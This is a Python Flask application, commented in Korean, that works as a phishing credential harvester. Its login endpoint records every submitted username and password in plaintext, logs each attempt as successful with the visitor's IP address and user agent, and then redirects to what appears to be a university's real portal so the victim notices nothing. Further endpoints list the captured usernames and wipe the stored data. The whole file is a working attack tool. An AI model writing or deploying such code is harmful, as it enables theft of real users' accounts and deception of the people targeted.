import os, datetime
from dotenv import load_dotenv
from flask import Flask, request, jsonify
from flask_sqlalchemy import SQLAlchemy
from flask import redirect

load_dotenv()

app = Flask(__name__)
app.config["SECRET_KEY"] = os.getenv("SECRET_KEY", "dev-secret")
app.config["SQLALCHEMY_DATABASE_URI"] = os.getenv("DATABASE_URL", "sqlite:///auth.db")
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False

db = SQLAlchemy(app)

# ---- Models ----
# 데이터베이스 모델 정의
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, index=True, nullable=False)
    pw_hash = db.Column(db.LargeBinary(60), nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.datetime.utcnow)
# 로그인 시도 기록 모델
class LoginAttempt(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), index=True, nullable=False)
    success = db.Column(db.Boolean, default=False)
    ip = db.Column(db.String(64))
    user_agent = db.Column(db.Text)
    created_at = db.Column(db.DateTime, default=datetime.datetime.utcnow)

with app.app_context():
    db.create_all()

# ---- Routes ----
# 로그인 API
@app.route("/api/auth/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        data = request.get_json(force=True, silent=True) or request.form
        username = (data.get("username") or "").strip()
        password = (data.get("password") or "")

        # 아이디와 비밀번호를 평문으로 저장
        user = User(username=username, pw_hash=password.encode())
        db.session.add(user)

        # 로그인 시도 로깅
        db.session.add(LoginAttempt(
            username=username,
            success=True,  # 항상 성공으로 저장
            ip=request.remote_addr,
            user_agent=request.headers.get("User-Agent", ""),
        ))
        db.session.commit()

        # POST 요청에서만 리다이렉트
        return redirect("https://klas.kw.ac.kr/")

    # GET 요청 처리
    return jsonify({"message": "Login page"})

# 사용자 정보를 반환하는 엔드포인트 추가
@app.route("/api/auth/users", methods=["GET"])
def get_users():
    users = User.query.all()
    user_list = [{"id": user.id, "username": user.username, "created_at": user.created_at} for user in users]
    return jsonify(user_list), 200

# 데이터베이스 초기화 엔드포인트 추가
@app.route("/api/auth/reset", methods=["POST"])
def reset_database():
    try:
        # 모든 데이터 삭제
        db.session.query(User).delete()
        db.session.query(LoginAttempt).delete()
        db.session.commit()
        return jsonify({"message": "Database reset successful"}), 200
    except Exception as e:
        db.session.rollback()
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    
    app.run(host="0.0.0.0", port=5000)
